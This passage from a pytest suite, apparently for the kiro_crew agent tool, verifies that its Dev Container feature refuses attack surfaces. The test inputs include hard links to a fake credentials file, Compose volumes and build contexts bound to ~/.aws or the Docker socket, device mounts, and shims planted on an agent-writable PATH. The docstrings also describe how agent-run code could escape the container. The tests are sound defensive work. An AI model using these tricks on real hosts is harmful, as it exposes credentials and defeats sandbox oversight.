        host = devc._volume_host_part(app["volumes"][0])
        expected = os.path.realpath(os.path.join(str(project / ".devcontainer"), "../src"))
        assert host == expected, "frozen source disagrees with what screening resolved"
        assert os.path.isabs(host)

    def test_the_container_side_of_the_bind_survives(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Rewriting the host half must not eat the target or the options."""
        project = self._project(tmp_path, "    volumes:\n      - ../src:/src:ro\n")
        app, _ = self._frozen_app(project)
        assert app["volumes"][0].endswith(":/src:ro")

    def test_the_long_form_source_is_absolutized(self, tmp_path: Path, trust_home: Path) -> None:
        project = self._project(
            tmp_path,
            "    volumes:\n      - type: bind\n        source: ../src\n        target: /src\n",
        )
        app, _ = self._frozen_app(project)
        assert os.path.isabs(app["volumes"][0]["source"])
        assert app["volumes"][0]["target"] == "/src"

    def test_a_relative_env_file_is_absolutized(self, tmp_path: Path, trust_home: Path) -> None:
        project = self._project(tmp_path, "    env_file: ../shared.env\n")
        app, _ = self._frozen_app(project)
        assert os.path.isabs(app["env_file"])
        assert app["env_file"].endswith("shared.env")

    def test_a_named_volume_is_left_alone(self, tmp_path: Path, trust_home: Path) -> None:
        """A bare token has no host side; turning it into a path would invent a
        bind the project never asked for."""
        project = self._project(tmp_path, "    volumes:\n      - myvol:/data\n")
        app, _ = self._frozen_app(project)
        assert app["volumes"][0] == "myvol:/data"

    def test_an_already_absolute_source_is_unchanged(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        benign = tmp_path / "data"
        benign.mkdir()
        project = self._project(tmp_path, f"    volumes:\n      - {benign}:/data\n")
        app, _ = self._frozen_app(project)
        assert app["volumes"][0] == f"{benign}:/data"

    def test_no_relative_host_path_survives_into_the_build_dir(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The invariant behind the whole class, stated directly: nothing left in
        the frozen copy may resolve against the build dir."""
        project = self._project(
            tmp_path,
            "    volumes:\n      - ../a:/a\n      - ./b:/b\n      - vol:/c\n"
            "    env_file:\n      - ../x.env\n",
        )
        app, build_dir = self._frozen_app(project)
        # Same drive-letter hazard as above: use the production splitter.
        hosts = [devc._volume_host_part(v) for v in app["volumes"]]
        for host in hosts:
            if host == "vol":
                continue  # named volume, no host side
            assert os.path.isabs(host), f"{host!r} would re-anchor to {build_dir}"
        assert os.path.isabs(app["env_file"][0])


class TestHardLinkedInputsAreRefused:
    """A hard link is invisible to every path-based check.

    The symlink refusal and the sensitive-path screen both look at NAMES. A hard
    link inside ``.devcontainer/`` is an ordinary regular file with a benign name
    whose inode is the credential file, so both checks pass -- and a Dockerfile
    ``COPY`` then bakes it into an image the agent can read. Link count is the
    only signal available locally, so a second name for the inode is refused.

    Revert-verified: dropping the ``st_nlink`` check admits every case here while
    the symlink tests stay green, so this is a genuinely separate surface.
    """

    @staticmethod
    def _secret(tmp_path: Path) -> Path:
        secret = tmp_path / "pretend-credentials"
        secret.write_text("[default]\naws_secret_access_key = x\n", encoding="utf-8")
        return secret

    def test_a_hard_linked_tree_member_is_refused(self, tmp_path: Path) -> None:
        secret = self._secret(tmp_path)
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "alpine"}).encode())
        os.link(secret, dc / "creds")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="hard link"):
            devc.config_digest(cfg)

    def test_a_hard_linked_config_file_itself_is_refused(self, tmp_path: Path) -> None:
        """The config is read through the same guarded reader as the tree."""
        secret = self._secret(tmp_path)
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        os.link(secret, dc / "devcontainer.json")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="hard link"):
            devc.config_digest(cfg)

    def test_an_ordinary_tree_is_still_accepted(self, tmp_path: Path) -> None:
        """Kept beside the refusals: single-link files are the normal case, and a
        guard that rejected them would make the feature unusable."""
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "alpine"}).encode())
        (dc / "Dockerfile").write_text("FROM alpine\n", encoding="utf-8")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)


class TestPreflightProbesTheRealExecUser:
    """The probe must run as the user the real exec will use.

    Without ``-u``, docker runs the probe as the image's DEFAULT user. An image
    with kiro-cli on root's PATH but not on the remoteUser's would clear the
    preflight and then fail 127 at startup -- a preflight that passes exactly the
    case it exists to catch.
    """

    def test_the_probe_and_the_real_exec_agree_on_the_user_flag(self) -> None:
        """Read from source: both call sites must carry the same -u argument, and
        a divergence is the bug, so they are compared rather than each asserted
        against a hardcoded expectation."""
        src = Path(devc.__file__).read_text(encoding="utf-8")
        assert 'probe_argv += ["-u", info.remote_user]' in src
        assert 'argv += ["-u", info.remote_user]' in src

    def test_the_probe_omits_the_flag_when_no_remote_user_is_reported(self) -> None:
        """An empty remoteUser means the CLI did not report one; passing `-u ''`
        would be an error rather than a default."""
        src = Path(devc.__file__).read_text(encoding="utf-8")
        block = src[src.index("probe_argv = [") :]
        block = block[: block.index("probe = await")]
        assert "if info.remote_user:" in block


class TestComposeSurfacesOutsideServiceVolumes:
    """Compose reaches host paths through more than ``services.*.volumes``.

    Two of these are not variants of a bind, they are separate mechanisms:

    * A top-level ``volumes:`` entry with ``driver_opts.device`` is a NAMED
      volume that is really a bind. The service side reads ``creds:/root/.aws``,
      which the screen correctly treats as a bare name with no host side -- the
      host path exists only in the top-level definition, so screening services
      alone never sees it.
    * A ``build.context`` is read by the daemon and every ``COPY`` in the
      Dockerfile can reach it, so a context of ``$HOME`` puts credentials into
      the image the agent then runs. No mount is declared anywhere.

    ``secrets``/``configs`` with ``file:`` are the same shape as ``env_file``:
    host content injected by the runtime.

    Revert-verified: dropping the top-level collection admits the named-volume
    and secrets cases while the service-volume tests stay green.
    """

    @staticmethod
    def _project(tmp_path: Path, compose: str) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(compose, encoding="utf-8")
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        return project

    @staticmethod
    def _aws() -> str:
        return os.path.join(os.path.expanduser("~"), ".aws")

    def test_a_named_volume_bound_to_a_credential_dir_is_refused(self, tmp_path: Path) -> None:
        """The service reference alone looks like a harmless name."""
        project = self._project(
            tmp_path,
            "services:\n  app:\n    image: alpine\n    volumes:\n      - creds:/root/.aws\n"
            "volumes:\n  creds:\n    driver: local\n    driver_opts:\n"
            f"      type: none\n      o: bind\n      device: {self._aws()}\n",
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_a_named_volume_bound_to_the_docker_socket_is_refused(self, tmp_path: Path) -> None:
        """Reaches the host-control screen too, not only the credential one."""
        project = self._project(
            tmp_path,
            "services:\n  app:\n    image: alpine\n    volumes:\n      - sock:/s\n"
            "volumes:\n  sock:\n    driver_opts:\n      device: /var/run/docker.sock\n",
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="host control interface"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "body",
        [
            "  app:\n    build:\n      context: {t}\n",
            "  app:\n    build: {t}\n",
            "  app:\n    build:\n      context: .\n      dockerfile: {t}\n",
        ],
        ids=["context", "string-shorthand", "dockerfile"],
    )
    def test_a_build_input_outside_the_project_is_refused(self, tmp_path: Path, body: str) -> None:
        project = self._project(tmp_path, "services:\n" + body.format(t=self._aws()))
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize("section", ["secrets", "configs"])
    def test_a_top_level_file_entry_is_refused(self, tmp_path: Path, section: str) -> None:
        target = os.path.join(self._aws(), "credentials")
        project = self._project(
            tmp_path,
            "services:\n  app:\n    image: alpine\n" f"{section}:\n  s1:\n    file: {target}\n",
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "compose",
        [
            "services:\n  app:\n    image: alpine\n    volumes:\n      - myvol:/data\n"
            "volumes:\n  myvol: {}\n",
            "services:\n  app:\n    build:\n      context: .\n",
        ],
        ids=["plain-named-volume", "context-inside-project"],
    )
    def test_benign_equivalents_are_still_accepted(self, tmp_path: Path, compose: str) -> None:
        """A named volume with no driver_opts genuinely has no host side, and a
        context inside the project is the normal case."""
        project = self._project(tmp_path, compose)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)

    def test_the_new_surfaces_are_absolutized_in_the_frozen_copy(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Same re-anchoring rule as binds: the frozen copy lives in the build
        dir, so a relative path there would resolve somewhere else entirely."""
        project = self._project(
            tmp_path,
            "services:\n  app:\n    build:\n      context: ./ctx\n"
            "volumes:\n  v:\n    driver_opts:\n      device: ../dev\n"
            "secrets:\n  s:\n    file: ../secret.txt\n",
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        frozen = [f for f in out.parent.iterdir() if f.name.startswith("compose-")]
        assert frozen
        doc = yaml.safe_load(frozen[0].read_text(encoding="utf-8"))
        assert os.path.isabs(doc["services"]["app"]["build"]["context"])
        assert os.path.isabs(doc["volumes"]["v"]["driver_opts"]["device"])
        assert os.path.isabs(doc["secrets"]["s"]["file"])


class TestDevOptInGate:
    """Dev Containers need TWO locks open: the env opt-in and the config mode.

    The config key alone is reachable by anyone following the docs, and a session
    inside the container loses the MCP-backed capabilities (scheduled jobs,
    subagents, saved lessons). That is too sharp an edge to hand a user who only
    flipped a documented setting, so the environment gate marks "a developer
    accepted an unfinished feature" -- and it keeps CI, which carries no such
    variable, on the host path.

    Revert-verified: dropping the env check from ``devcontainers_enabled`` makes
    the config-only cases below report enabled.
    """

    @pytest.mark.parametrize(
        "value,expected",
        [
            ("1", True),
            ("true", True),
            ("TRUE", True),
            ("yes", True),
            ("on", True),
            ("0", False),
            ("false", False),
            ("", False),
            ("maybe", False),
            (" 1 ", True),
        ],
        ids=["one", "true", "upper", "yes", "on", "zero", "false", "empty", "junk", "padded"],
    )
    def test_the_env_gate_reads_only_explicit_truthy_values(
        self, value: str, expected: bool
    ) -> None:
        """A stray ``=0`` must read as disabled, not as "the name is present"."""
        assert devc.dev_optin_enabled({devc.DEVCONTAINER_ENV_VAR: value}) is expected

    def test_an_absent_variable_is_off(self) -> None:
        assert devc.dev_optin_enabled({}) is False

    @staticmethod
    def _cfg(mode: str) -> type:
        class _Cfg:
            class agent:
                devcontainer = mode

            @staticmethod
            def load() -> type:
                return _Cfg

        return _Cfg

    def test_config_auto_without_the_env_gate_is_still_off(self) -> None:
        """The case the gate exists for: an operator flipped the documented
        setting but never opted in as a developer."""
        with patch("kiro_crew.config.loader.KiroCrewConfig", self._cfg("auto")):
            assert devc.devcontainers_enabled({}) is False

    def test_the_env_gate_without_config_auto_is_off(self) -> None:
        """Neither lock alone suffices, in either order."""
        with patch("kiro_crew.config.loader.KiroCrewConfig", self._cfg("off")):
            assert devc.devcontainers_enabled({devc.DEVCONTAINER_ENV_VAR: "1"}) is False

    def test_both_locks_open_enables_the_feature(self) -> None:
        with patch("kiro_crew.config.loader.KiroCrewConfig", self._cfg("auto")):
            assert devc.devcontainers_enabled({devc.DEVCONTAINER_ENV_VAR: "1"}) is True

    def test_an_unreadable_config_is_off_rather_than_on(self) -> None:
        """Fails closed: a config that cannot be loaded must not admit the
        feature just because the env gate happens to be set."""

        class _Boom:
            @staticmethod
            def load() -> type:
                raise RuntimeError("config unreadable")

        with patch("kiro_crew.config.loader.KiroCrewConfig", _Boom):
            assert devc.devcontainers_enabled({devc.DEVCONTAINER_ENV_VAR: "1"}) is False

    @pytest.mark.asyncio
    async def test_the_resolver_stays_on_the_host_without_the_env_gate(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """End to end at the spawn seam: a project that ships a config and is
        fully trusted must still resolve to the host."""
        monkeypatch.delenv(devc.DEVCONTAINER_ENV_VAR, raising=False)
        monkeypatch.setattr(devc.sys, "platform", "linux")
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "alpine"}).encode())

        called = {"up": 0}

        async def _never(_w: object) -> object:
            called["up"] += 1
            raise AssertionError("up() must not run without the dev opt-in")

        with (
            patch("kiro_crew.config.loader.KiroCrewConfig", self._cfg("auto")),
            patch.object(devc, "docker_available", return_value=True),
            patch.object(devc, "is_trusted", return_value=True),
            patch.object(devc, "get_manager", return_value=SimpleNamespace(up=_never)),
        ):
            info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is None, "nothing to report: the feature does not exist here"
        assert called["up"] == 0

    @pytest.mark.asyncio
    async def test_status_reports_disabled_without_the_env_gate(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The dashboard must not raise a trust prompt for a feature that cannot
        run -- a security prompt with no effect teaches clicking through ones
        that do have an effect."""
        monkeypatch.delenv(devc.DEVCONTAINER_ENV_VAR, raising=False)
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "alpine"}).encode())
        with patch("kiro_crew.config.loader.KiroCrewConfig", self._cfg("auto")):
            status = await devc.DevcontainerManager().status(project)
        assert status["enabled"] is False

    def test_the_refusal_message_names_both_locks_and_the_tradeoff(self) -> None:
        """It is the only place a developer learns why nothing happened, so it
        must name the variable, the config key, and what they give up."""
        msg = devc.gate_refusal_message()
        assert devc.DEVCONTAINER_ENV_VAR in msg
        assert "agent.devcontainer" in msg
        for lost in ("scheduled jobs", "subagents", "lessons"):
            assert lost in msg


class TestVerifiedToolResolution:
    """Container tooling must not be resolved through an agent-writable PATH.

    A gateway's PATH routinely leads with directories agent-run code writes -- a
    worktree venv's ``bin``, ``~/.local/bin``, a version-manager shim dir. A bare
    ``docker`` or ``devcontainer`` in argv therefore lets the agent plant a shim
    that the gateway executes ON THE HOST with its own environment, which inverts
    the premise of a feature whose whole point is that project code runs inside a
    container.

    The check is "could this process have written it", not "is it in an
    allowlisted directory": the gateway and the agent run as the same user, so
    writable-by-us is exactly substitutable-by-the-agent.

    Revert-verified: dropping the writability check admits the planted shim.
    """

    @staticmethod
    def _planted(tmp_path: Path, name: str, *, readonly_file: bool = False) -> Path:
        """Plant an executable *name* in a directory this process can write.

        The filename needs a platform-appropriate extension: Windows resolves a
        bare command through PATHEXT, so an extensionless file is not executable
        there and ``shutil.which`` never finds it. Without the extension these
        tests do not fail on Windows -- worse, they PASS vacuously, because
        ``_verified_tool`` returns None for "not found" rather than for "refused",
        which is the opposite of what they exist to prove.
        """
        d = tmp_path / "agent-writable-bin"
        d.mkdir(exist_ok=True)
        suffix = ".cmd" if sys.platform == "win32" else ""
        tool = d / f"{name}{suffix}"
        tool.write_text("#!/bin/sh\necho substituted\n", encoding="utf-8")
        tool.chmod(0o555 if readonly_file else 0o755)
        return tool

    def test_a_shim_in_a_writable_path_dir_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        tool = self._planted(tmp_path, "kirocrew-fake-tool")
        monkeypatch.setenv("PATH", f"{tool.parent}{os.pathsep}{os.environ.get('PATH', '')}")
        # Asserted so a resolution miss can never be mistaken for a refusal.
        assert shutil.which("kirocrew-fake-tool") is not None, "fixture did not take effect"
        assert devc._verified_tool("kirocrew-fake-tool") is None

    def test_a_readonly_file_in_a_writable_dir_is_still_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A file-only permission check is insufficient: a writable PARENT lets
        the agent unlink and recreate the binary, so the whole ancestor chain
        has to be clean."""
        tool = self._planted(tmp_path, "kirocrew-fake-ro", readonly_file=True)
        monkeypatch.setenv("PATH", f"{tool.parent}{os.pathsep}{os.environ.get('PATH', '')}")
        # Both guards matter: the tool must actually RESOLVE (else None would
        # mean "not found"), and the file itself must be non-writable (else the
        # refusal would not be attributable to the parent directory).
        assert shutil.which("kirocrew-fake-ro") is not None, "fixture did not take effect"
        if sys.platform != "win32":
            # Windows ignores the POSIX mode bits used here, so the read-only
            # premise only holds on POSIX; the ancestor logic is asserted on both.
            assert not os.access(tool, os.W_OK), "fixture should be a read-only file"
        assert devc._verified_tool("kirocrew-fake-ro") is None

    def test_the_writable_component_is_named_for_diagnosis(self, tmp_path: Path) -> None:
        """The operator has to be told WHICH component disqualified the path, or
        a refusal on a host where the tool really is installed is unactionable."""
        tool = self._planted(tmp_path, "kirocrew-fake-named")
        offender = devc._agent_writable(str(tool))
        assert offender is not None
        assert str(tmp_path) in offender

    def test_a_root_owned_system_binary_is_accepted(self) -> None:
        """The guard must not refuse ordinary installs. ``sh`` lives in a pinned
        system directory on every POSIX host the feature supports."""
        if devc.sys.platform == "win32":
            pytest.skip("POSIX system-directory layout")
        resolved = devc._verified_tool("sh")
        assert resolved is not None
        assert os.path.isabs(resolved)
        assert devc._agent_writable(resolved) is None

    def test_an_absent_tool_is_unavailable_not_an_error(self) -> None:
        assert devc._verified_tool("kirocrew-tool-that-does-not-exist") is None

    def test_docker_bin_refuses_rather_than_returning_a_bare_name(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Falling back to ``"docker"`` on a miss would reintroduce the very PATH
        lookup this exists to avoid, so the miss is an error instead."""
        monkeypatch.setattr(devc, "_docker_bin", _REAL_DOCKER_BIN)
        monkeypatch.setattr(devc, "_verified_tool", lambda name: None)
        with pytest.raises(devc.DevcontainerError, match="trusted location"):
            devc._docker_bin()

    def test_the_cli_resolver_refuses_when_nothing_is_verified(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(devc, "_verified_tool", lambda name: None)
        with pytest.raises(devc.DevcontainerError, match="trusted location"):
            devc._cli_argv()

    def test_there_is_no_npx_download_fallback(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A verified ``npx`` binary must NOT be accepted as a way to run the CLI.

        Verifying the npx BINARY says nothing about the code npx then fetches:
        resolution is steered by project-local ``.npmrc`` settings that agent-run
        code can write, so a download-on-demand fallback executes an
        attacker-chosen package on the HOST -- outside the container the feature
        exists to confine, and outside the trust grant.

        The previous test patched every lookup to None, so it passed whether or
        not the fallback existed and proved nothing about it. Here npx resolves
        successfully and the CLI still has to be refused.
        """
        monkeypatch.setattr(
            devc,
            "_verified_tool",
            lambda name: "/usr/bin/npx" if name == "npx" else None,
        )
        with pytest.raises(devc.DevcontainerError, match="no download-on-demand fallback"):
            devc._cli_argv()

    def test_an_installed_cli_is_still_used(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Acceptance case: removing the fallback must not break the supported
        install, or the feature would be unreachable rather than hardened."""
        monkeypatch.setattr(
            devc,
            "_verified_tool",
            lambda name: "/usr/bin/devcontainer" if name == "devcontainer" else None,
        )
        assert devc._cli_argv() == ["/usr/bin/devcontainer"]

    def test_every_docker_invocation_routes_through_the_resolver(self) -> None:
        """One unverified spawn defeats the guard, so no bare "docker" literal may
        survive in an argv position -- asserted against the source because the
        alternative is trusting that every call site was found by hand."""
        src = Path(devc.__file__).read_text(encoding="utf-8")
        offenders = [
            (i, line.strip())
            for i, line in enumerate(src.splitlines(), 1)
            if '"docker"' in line and "_verified_tool" not in line
        ]
        assert not offenders, f"bare docker literal in argv position: {offenders}"


class TestDisabledSubsystemIsNotLoadedAtBoot:
    """A gateway without the developer opt-in must not load the subsystem.

    Importing the dashboard server pulled in the whole Dev Container module and
    its handlers, so an install that can never use the feature still paid for it
    before the socket bind. Gating the import (not just the routes) is what makes
    the preview genuinely absent rather than merely inert.

    Gated on the ENVIRONMENT lock only: it is fixed for the process lifetime, so
    deciding the route table from it is sound, while ``agent.devcontainer`` stays
    live-readable.
    """

    def test_importing_the_dashboard_server_does_not_load_the_subsystem(self) -> None:
        """Asserted on a child interpreter: this test process has already
        imported the module, so an in-process check could never fail."""
        code = (
            "import sys, os; os.environ.pop('KIROCREW_DEVCONTAINERS', None);"
            "import kiro_crew.dashboard.server;"
            "print(int(any(m in sys.modules for m in "
            "('kiro_crew.devcontainer','kiro_crew.dashboard.handlers.devcontainer'))))"
        )
        out = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, timeout=180
        )
        assert out.returncode == 0, out.stderr[-2000:]
        assert out.stdout.strip().endswith(
            "0"
        ), f"devcontainer modules were imported at dashboard boot: {out.stdout!r}"

    def test_registering_the_routes_does_not_load_the_subsystem_either(self) -> None:
        """The stronger claim, and the one the test above does NOT make.

        Importing ``dashboard.server`` was clean while the registration FUNCTION
        still did ``from kiro_crew.devcontainer import dev_optin_enabled`` before
        checking the gate -- so the real boot path (``start_dashboard`` ->
        register) loaded the whole optional subsystem anyway, and the gate only
        skipped the handlers module. Asserting module-import cleanliness alone
        gave false confidence; this calls the registration exactly as boot does.
        """
        code = (
            "import sys, os; os.environ.pop('KIROCREW_DEVCONTAINERS', None);"
            "from aiohttp import web;"
            "import kiro_crew.dashboard.server as s;"
            "app = web.Application();"
            "s._register_devcontainer_routes(app);"
            "print('ROUTES', len([r for r in app.router.routes() "
            "if 'devcontainer' in str(r.resource.canonical)]));"
            "print('LOADED', int(any(m in sys.modules for m in "
            "('kiro_crew.devcontainer','kiro_crew.dashboard.handlers.devcontainer'))))"
        )
        out = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, timeout=180
        )
        assert out.returncode == 0, out.stderr[-2000:]
        assert "ROUTES 0" in out.stdout, out.stdout
        assert (
            "LOADED 0" in out.stdout
        ), f"the gate ran but the subsystem was imported anyway: {out.stdout!r}"

    def test_registration_imports_nothing_even_with_the_env_gate_open(self) -> None:
        """The case that kept recurring: env gate SET, ``agent.devcontainer`` at
        its default ``off``. Gating the import on both locks would have fixed this
        instance while making the route table depend on live-read config, so an
        operator flipping the config on would need a restart. Deferring the
        handler import to the first REQUEST removes the boot cost under every
        combination of the two locks instead of one more of them.
        """
        code = (
            "import sys, os;"
            "os.environ['KIROCREW_DEVCONTAINERS']='1';"
            "from aiohttp import web;"
            "import kiro_crew.dashboard.server as s;"
            "app=web.Application();"
            "s._register_devcontainer_routes(app);"
            "print('ROUTES', len([r for r in app.router.routes() "
            "if 'devcontainer' in str(r.resource.canonical)]));"
            "print('LOADED', int(any(m in sys.modules for m in "
            "('kiro_crew.devcontainer','kiro_crew.dashboard.handlers.devcontainer'))))"
        )
        out = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, timeout=240
        )
        assert out.returncode == 0, out.stderr[-2000:]
        # Routes must exist (the env gate is open) while the subsystem stays
        # unloaded -- both halves matter, since registering nothing would also
        # satisfy a LOADED-only assertion.
        assert "ROUTES 7" in out.stdout, out.stdout
        assert "LOADED 0" in out.stdout, out.stdout

    def test_routes_are_absent_without_the_opt_in(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from aiohttp import web

        from kiro_crew.dashboard import server as dash_server

        monkeypatch.delenv(devc.DEVCONTAINER_ENV_VAR, raising=False)
        app = web.Application()
        dash_server._register_devcontainer_routes(app)
        assert not [r for r in app.router.routes() if "devcontainer" in str(r.resource.canonical)]

    def test_every_endpoint_is_registered_with_the_opt_in(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Pins the exact method/path set: a count would be an assertion about
        aiohttp (``add_get`` also registers HEAD) rather than about this gate."""
        from aiohttp import web

        from kiro_crew.dashboard import server as dash_server

        monkeypatch.setenv(devc.DEVCONTAINER_ENV_VAR, "1")
        app = web.Application()
        dash_server._register_devcontainer_routes(app)
        got = {
            (r.method, str(r.resource.canonical))
            for r in app.router.routes()
            if "devcontainer" in str(r.resource.canonical)
        }
        assert got == {
            ("GET", "/api/devcontainer/status"),
            ("HEAD", "/api/devcontainer/status"),
            ("GET", "/api/devcontainer/config"),
            ("HEAD", "/api/devcontainer/config"),
            ("POST", "/api/devcontainer/trust"),
            ("DELETE", "/api/devcontainer/trust"),
            ("POST", "/api/devcontainer/rebuild"),
        }


class TestComposeAndDockerControlSurfaces:
    """Valid Compose/Docker surfaces that reached the daemon unscreened.

    The sensitive-path screen understood bind syntax and the host-file-reading
    flags, but three real surfaces bypassed it entirely. Two are ordinary
    unscreened host paths; ``extends.file`` is a different and worse problem --
    see that test.

    ``--privileged`` is deliberately NOT refused here: it carries no host path,
    the feature is documented as VS Code parity (a config that asks for it gets
    it once a human approves that config), and the raw text carrying it is what
    the human reads at the trust prompt. Refusing it would be a different feature.
    """

    @pytest.mark.parametrize(
        "run_args",
        [
            ["--device=/dev/kmsg"],
            ["--device", "/dev/kmsg"],
            ["--device", "/dev/sda:/dev/xvda:rwm"],
        ],
        ids=["equals-form", "separate-arg", "with-container-side-and-perms"],
    )
    def test_device_host_nodes_are_collected_for_screening(self, run_args: list[str]) -> None:
        """``/dev`` is already a refused control tree, so collecting the path IS
        the fix -- the gap was that this flag was never parsed at all."""
        found = devc._collect_host_mount_sources({"runArgs": run_args})
        assert any(f.startswith("/dev/") for f in found), found

    @pytest.mark.parametrize(
        "build",
        [
            {"additional_contexts": {"creds": "/host/secrets"}},
            {"additional_contexts": ["creds=/host/secrets"]},
        ],
        ids=["mapping-form", "list-form"],
    )
    def test_additional_build_contexts_are_collected(self, build: dict) -> None:
        """An extra build context is read by the daemon exactly like ``context``
        and is reachable from any ``COPY --from``."""
        assert "/host/secrets" in devc._compose_service_host_paths({"build": build})

    @pytest.mark.parametrize(
        "value",
        ["service:api", "target:builder", "docker-image://alpine", "https://example.com/ctx.tar"],
    )
    def test_named_contexts_that_are_not_host_paths_are_not_screened(self, value: str) -> None:
        """Kept as an acceptance case so a blanket refusal cannot pass this
        class: BuildKit lets a named context point at a service, target, image or
        URL, none of which is a host path."""
        found = devc._compose_service_host_paths({"build": {"additional_contexts": {"x": value}}})
        assert found == [], found

    def test_extends_file_is_refused_rather_than_screened(self) -> None:
        """Refused, not screened, because the problem is not the paths inside it.

        ``extends.file`` pulls a service definition from ANOTHER compose file that
        may sit outside ``.devcontainer/`` and therefore outside the hashed tree.
        Its volumes and build stanzas would take effect while contributing
        nothing to the digest, so the grant would be bound to content that does
        not describe what gets built -- and later edits to the extended file would
        not invalidate it. Screening its paths would leave that hole open.
        """
        with pytest.raises(devc.DevcontainerError, match="cannot be covered by the trust digest"):
            devc._compose_service_host_paths(
                {"extends": {"file": "../../common.yml", "service": "base"}}
            )

    def test_extends_within_the_same_file_is_allowed(self) -> None:
        """The same-file form names a sibling service that IS in the hashed tree,
        so it is covered by the grant and must keep working."""
        assert devc._compose_service_host_paths({"extends": {"service": "base"}}) == []

    def test_an_ordinary_service_is_still_accepted(self) -> None:
        found = devc._compose_service_host_paths(
            {"build": {"context": ".", "dockerfile": "Dockerfile"}, "volumes": ["./src:/workspace"]}
        )
        assert "." in found and "./src" in found


class TestAgentDefinitionMustBeContainerVisible:
    """Moving kiro-cli into the container moves it away from Kiro home state.

    Agent definitions are looked up as FILES, and kiro-cli resolves ``--agent``
    against ``$PWD/.kiro/agents`` before ``~/.kiro/agents``. That split decides
    the outcome once containerized: a project-scoped definition rides in on the
    workspace bind and works, while a global one is host-only machine state that
    no ordinary image carries, so ``--agent <name>`` had nothing to load and
    startup failed as a generic ACP init error naming no cause.

    A missing project file is not an immediate refuse: the selected host
    ``~/.kiro/agents/<name>.json`` is copied into a gateway-owned bind and the
    probe runs again. The whole host agents directory is still not mounted,
    because those definitions carry MCP credentials in ``env``.
    """

    @staticmethod
    def _info() -> devc.DevcontainerInfo:
        return devc.DevcontainerInfo(
            container_id="cid123",
            remote_workspace_folder="/workspaces/proj",
            remote_user="vscode",
            project_dir="/host/proj",
            config_digest="deadbeef",
            created_at=0.0,
        )

    class _Proc:
        def __init__(self, rc: int) -> None:
            self.returncode = rc

        async def wait(self) -> int:
            return self.returncode

        def kill(self) -> None:
            pass

    def _fake_exec(self, rc: int, sink: list[list[str]]):
        async def _inner(
            *argv: str, **kw: object
        ) -> "TestAgentDefinitionMustBeContainerVisible._Proc":
            sink.append(list(argv))
            return self._Proc(rc)

        return _inner

    @pytest.mark.asyncio
    async def test_both_lookup_locations_are_probed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Probing only the home location would refuse the project-scoped case
        that actually works, and probing only the project location would pass an
        image whose definition is in neither place."""
        sink: list[list[str]] = []
        monkeypatch.setattr(devc.asyncio, "create_subprocess_exec", self._fake_exec(0, sink))
        await devc.ensure_agent_definition_available(self._info(), "kirocrew")
        script = sink[-1][-1]
        # Anchored on the `test -f ` prefix, NOT a bare substring: the
        # project-relative path is a suffix of the home path, so
        # `".kiro/agents/x.json" in script` is satisfied by the home probe alone
        # and would pass even if the project location were dropped entirely.
        assert "test -f .kiro/agents/kirocrew.json" in script, script
        assert "test -f ~/.kiro/agents/kirocrew.json" in script, script

    @pytest.mark.asyncio
    async def test_the_probe_matches_the_real_exec_user_and_workdir(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A probe run as the image default in the wrong directory would clear
        the exact case it exists to catch -- the project-relative lookup is
        resolved against the workspace folder."""
        sink: list[list[str]] = []
